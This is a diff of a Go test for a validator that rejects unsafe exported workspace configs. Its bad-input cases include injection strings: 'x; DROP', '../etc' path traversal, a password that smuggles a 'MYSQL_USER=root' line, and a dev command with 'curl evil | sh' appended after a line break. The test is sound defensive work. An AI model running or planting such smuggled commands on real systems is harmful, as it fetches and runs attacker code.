@@ -175,7 +175,7 @@ func TestCheckURLUnique(t *testing.T) {
 // Nothing from an invalid file may be applied: validateExported runs first.
 func TestValidateExported(t *testing.T) {
 	ok := ExportedConfig{WorkspacePath: "/home/u/workspace", Docker: config.DockerConfig{
-		MariaDB: config.MariaDBConfig{DBUser: "dev_user"},
+		MariaDB: config.MariaDBConfig{DBUser: "dev_user", DBPass: "s3cr3t"},
 		Apps:    []config.AppContainer{validPHPApp("a", "a.localhost"), validPHPApp("b", "b.localhost")},
 	}}
 	if err := validateExported(ok); err != nil {
@@ -183,12 +183,22 @@ func TestValidateExported(t *testing.T) {
 	}
 
 	bad := map[string]func(*ExportedConfig){
-		"relative workspace": func(e *ExportedConfig) { e.WorkspacePath = "workspace" },
-		"bad db user":        func(e *ExportedConfig) { e.Docker.MariaDB.DBUser = "x; DROP" },
-		"invalid app":        func(e *ExportedConfig) { e.Docker.Apps[0].Folder = "../etc" },
-		"duplicate folder":   func(e *ExportedConfig) { e.Docker.Apps[1].Folder = "a" },
-		"duplicate url":      func(e *ExportedConfig) { e.Docker.Apps[1].URL = "a.localhost" },
-		"reserved folder":    func(e *ExportedConfig) { e.Docker.Apps[0].Folder = "nginx" },
+		"relative workspace":              func(e *ExportedConfig) { e.WorkspacePath = "workspace" },
+		"bad db user":                     func(e *ExportedConfig) { e.Docker.MariaDB.DBUser = "x; DROP" },
+		"invalid app":                     func(e *ExportedConfig) { e.Docker.Apps[0].Folder = "../etc" },
+		"duplicate folder":                func(e *ExportedConfig) { e.Docker.Apps[1].Folder = "a" },
+		"duplicate url":                   func(e *ExportedConfig) { e.Docker.Apps[1].URL = "a.localhost" },
+		"reserved folder":                 func(e *ExportedConfig) { e.Docker.Apps[0].Folder = "nginx" },
+		"empty db password":               func(e *ExportedConfig) { e.Docker.MariaDB.DBPass = "" },
+		"db password with a line break":   func(e *ExportedConfig) { e.Docker.MariaDB.DBPass = "a\nMYSQL_USER=root" },
+		"root password with a line break": func(e *ExportedConfig) { e.Docker.MariaDB.DBRootPass = "a\r" },
+		"bad data user":                   func(e *ExportedConfig) { e.Docker.MariaDB.DataUser = "x; DROP" },
+		"line break in the start command": func(e *ExportedConfig) {
+			e.Docker.Apps[0] = config.AppContainer{Folder: "a", URL: "a.localhost", Type: config.AppTypeNode, NodeVersion: "24", DevPort: 5173, DevCommand: "npm run dev\ncurl evil | sh"}
+		},
+		"line break in the worker command": func(e *ExportedConfig) {
+			e.Docker.Apps[0] = config.AppContainer{Folder: "a", URL: "a.localhost", Type: config.AppTypePHPNode, PHPVersion: "8.2", NodeVersion: "24", DevPort: 5173, DevCommand: "npm run dev", WorkerCommand: "a\rb"}
+		},
 	}
 	for name, mutate := range bad {
 		e := ok
